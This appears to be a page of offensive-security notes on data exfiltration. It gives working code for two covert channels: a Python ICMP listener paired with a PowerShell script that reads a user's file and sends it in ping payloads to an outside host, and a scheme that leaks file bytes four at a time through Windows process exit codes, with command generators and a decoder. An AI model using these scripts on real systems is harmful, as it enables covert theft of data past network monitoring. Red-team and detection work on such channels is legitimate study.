# Data Exfiltration

## ICMP

### Extracting a File

By sending ping packets from our server, with the start marked by `^BOF` and the end marked by `EOF` , we can set up an icmplistener as below which decodes the data packets and then writes them to our file. This isn't as universal as metasploit's listener, but it servers as a quick and dirty poc if all you're looking to extract is a single file.

```python
import socket

def listen():
    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
    s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
    with open('icmpoutput.txt','wb') as catch:   
        while 1:
            data, addr = s.recvfrom(1508)
            print "Packet from %r: %r" % (addr,data)
            if '^BOF' in data:
                continue
            if '^EOF' in data:
                catch.write(data[-1472:-4])
            catch.write(data[-1472:])

listen()
```

A good option for recent Windows based systems is a modified [Powershell-ICMP-Sender](https://github.com/api0cradle/Powershell-ICMP).

```bash
    $IPAddress = "192.168.0.5"
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $true
    #$PingOptions.Ttl = 10

    # Must be divided into 1472 chunks
    [int]$bufSize = 1472
    $inFile = "C:\Users\bob\Desktop\backfile"


    $stream = [System.IO.File]::OpenRead($inFile)
    $chunkNum = 0
    $TotalChunks = [math]::floor($stream.Length / 1472)
    $barr = New-Object byte[] $bufSize

    # Start of Transfer
    $sendbytes = ([text.encoding]::ASCII).GetBytes("^BOFbackfile")
    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null


    while ($bytesRead = $stream.Read($barr, 0, $bufsize)) {
        $ICMPClient.Send($IPAddress,10, $barr, $PingOptions) | Out-Null
        $ICMPClient.PingCompleted

        #Missing check if transfer is okay, added sleep.
        sleep 2
        #$ICMPClient.SendAsync($IPAddress,60 * 1000, $barr, $PingOptions) | Out-Null
        Write-Output "Done with $chunkNum out of $TotalChunks"
        $chunkNum += 1
    }

    # End the transfer
    $sendbytes = ([text.encoding]::ASCII).GetBytes("^EOF")
    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
    Write-Output "File Transfered"
```

## Error Codes

We can exfiltrate arbitrary data via literally nothing but error-codes. Here I'll walk through the stages to set up and test this for exfiltrating some file.

An error code can have a maximum length of 32 bits, or 4 bytes. We can therefore encode 4 arbitrary bytes within the return of a windows command.

We have data stored within`$env:temp/merror.txt` and the only parameter we need to know is it's length. We can run an arbitrary command, store it's output in the file and find out its length by running the following:

```text
$command = (Invoke-Command -ScriptBlock {{{0}}} | Out-String).TrimStart().TrimEnd(); $command | Out-File $env:temp/merror.txt -encoding ASCII ;exit $command.length'.format(command)
```

We now have to generate our commands to split up the file and return the data. The following script will return an iterator that will yield commands to run on the remote machine, which will return error codes.

```python
def error_exfil(output_length):
    output_length = int(output_length)
    for start in range(0, int(output_length), 4):
        if (output_length - start) < 4:
            amount_to_fetch = output_length-start
        else:
            amount_to_fetch = "4"
        run_cmd = '$fs = Get-Content $env:temp/merror.txt -Encoding Byte -ReadCount 0; $bytearray = $fs[{0}..{1}]; $hex = [System.BitConverter]::ToString($bytearray) -replace \'-\',\'\';\
echo $hex; exit ([convert]::ToInt32($hex, 16));'.format(start, int(start)+int(amount_to_fetch)-1)
        yield run_cmd
```

Decoding them on the other end is as simple as:

```python
def decode_error(errorval):
    val = hex(int(errorval))[2:]
    if len(val)%2 !=0:
        val = '0'+ val

    return val.decode('hex')
```

